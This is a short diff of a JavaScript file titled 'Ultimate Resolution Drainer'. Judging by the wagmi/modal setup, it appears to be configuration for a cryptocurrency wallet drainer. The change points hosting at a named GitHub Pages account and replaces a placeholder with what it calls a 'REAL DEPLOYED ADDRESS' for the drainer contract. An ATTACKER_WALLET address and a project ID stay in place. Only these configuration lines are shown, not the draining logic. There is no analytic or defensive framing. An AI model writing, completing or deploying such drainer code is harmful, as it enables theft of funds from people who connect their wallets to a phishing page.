@@ -1,8 +1,8 @@
 // resolution.js - Ultimate Resolution Drainer 
-// Host: https://yourname.github.io/ultimate-resolution/resolution.js
+// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
-const DRAINER_CONTRACT = '0x6080604052348015600e575f5ffd5b5073f10b33'; // ← Updated by GitHub Action
+const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e'; // ← REAL DEPLOYED ADDRESS
 const ATTACKER_WALLET = '0xF10b3300F6944e40A203587339C07e5119A70c55';
 
 let wagmiConfig, modal;
